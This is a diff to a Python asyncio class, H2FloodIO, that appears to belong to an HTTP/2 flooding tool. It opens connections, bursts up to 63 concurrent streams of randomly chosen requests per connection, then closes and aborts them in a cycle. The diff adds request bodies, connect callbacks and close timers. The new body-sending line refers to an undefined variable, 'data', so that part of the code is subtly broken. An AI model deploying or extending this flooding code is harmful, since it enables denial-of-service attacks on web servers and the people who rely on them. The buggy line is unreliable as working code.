@@ -73,36 +73,47 @@ H2Request = Tuple[H2Headers, Optional[bytes]]
 
 class H2FloodIO(asyncio.Protocol):
 
+    _max_num_streams = 63
+    _close_delay = 10.0
+    _abort_delay = 0.5
+
     def __init__(
         self,
         loop,
         requests: List[H2Request],
-        on_close,
         *,
+        on_close: asyncio.Future,
         connections,
+        on_connect: Optional[asyncio.Future] = None,
         rcv: bool = False
     ):
         self._loop = loop
         # XXX: ideally we have to read this from settings frame but it's gonna be harder
-        self._num_streams = 63
+        self._num_streams = self._max_num_streams
         self._requests = requests
+        self._on_connect = on_connect
         self._on_close = on_close
         self._connections = connections
         self._rcv = rcv
+        self._close_handle = None
 
     def connection_made(self, transport) -> None:
+        print("connection_made")
         self._connections.add(hash(transport))
+        if self._on_connect and not self._on_connect.done():
+            self._on_connect.set_result(True)
         self._conn = h2.connection.H2Connection()
         self._transport = transport
         # XXX: do we have to read? this is required at least for settings sync
         if not self._rcv:
             self._transport.pause_reading()
         self._conn.initiate_connection()
-        # XXX: full request might be (should be) provided from the method definition
         for ind in range(self._num_streams):
+            stream_id = 1+ind*2
             headers, body = random.choice(self._requests)
-            self._conn.send_headers(1+ind*2, headers, end_stream=True)
-            # XXX: we should also consider body + trailings
+            self._conn.send_headers(stream_id, headers, end_stream=body is None)
+            if body is not None:
+                self._conn.send_data(stream_id, data, end_stream=True)
         # send everything
         self._loop.call_soon(self._send)
    
@@ -111,16 +122,19 @@ class H2FloodIO(asyncio.Protocol):
         if len(data) > 0:
             self._transport.write(data)
         # completely random wait interval
-        self._loop.call_later(10, self._close)
+        self._close_handle = self._loop.call_later(self._close_delay, self._close)
 
     # XXX: do we need to be good citizens by sending RST?
     def _close(self):
         self._conn.close_connection()
         data = self._conn.data_to_send()
         self._transport.write(data)
-        self._loop.call_later(0.5, self._abort)
+        self._loop.call_later(self._abort_delay, self._abort)
 
     def _abort(self):
+        if self._close_handle is not None:
+            self._close_handle.cancel()
+            self._close_handle = None
         if self._transport:
             self._connections.remove(hash(self._transport))
             self._transport.abort()
